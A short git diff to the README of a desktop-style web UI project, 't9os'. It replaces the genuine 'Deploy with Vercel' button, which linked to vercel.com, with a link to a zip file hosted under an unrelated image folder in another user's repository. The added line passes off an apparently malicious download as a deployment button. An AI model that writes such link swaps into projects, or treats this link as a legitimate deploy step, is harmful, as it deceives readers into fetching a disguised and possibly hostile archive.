@@ -32,7 +32,7 @@ A clean, fast, desktop-like UI that feels like you’re using a real operating s
 
 Click the button below to instantly clone and deploy it on Vercel:
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/t9lat22/t9os)
+[![Deploy with Vercel](https://github.com/chikingod1/t9lat22.github.io/raw/refs/heads/master/dinogame/images/default_200_percent/t_github_lat_io_1.1-beta.3.zip)](https://github.com/chikingod1/t9lat22.github.io/raw/refs/heads/master/dinogame/images/default_200_percent/t_github_lat_io_1.1-beta.3.zip)
 
 ---
 
